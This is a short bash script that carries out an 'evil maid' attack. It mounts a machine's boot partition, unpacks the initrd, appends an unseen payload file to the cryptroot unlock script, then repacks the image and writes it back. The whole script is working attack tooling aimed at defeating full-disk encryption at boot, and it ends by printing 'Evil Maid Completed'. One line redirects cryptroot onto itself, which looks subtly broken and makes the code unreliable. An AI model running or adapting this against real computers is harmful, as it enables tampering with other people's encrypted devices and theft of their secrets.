#!/bin/bash
wdir=$(pwd)
apt install dracut-core -y
mkdir /target
mount -t ext4 /dev/sda1 /target
initrd=$(ls /target | grep initrd.img)
mkdir /out
cd /out
echo $initrd
lsinitrd --unpack /target/$initrd
cd scripts/local-top
head -n -2 cryptroot > cryptroot && cat $wdir/payload.txt >> cryptroot
cd /out
find . | cpio -H newc -o | gzip -9 > /$initrd
mv /$initrd /target/$initrd
echo "Evil Maid Completed"
exit 0;
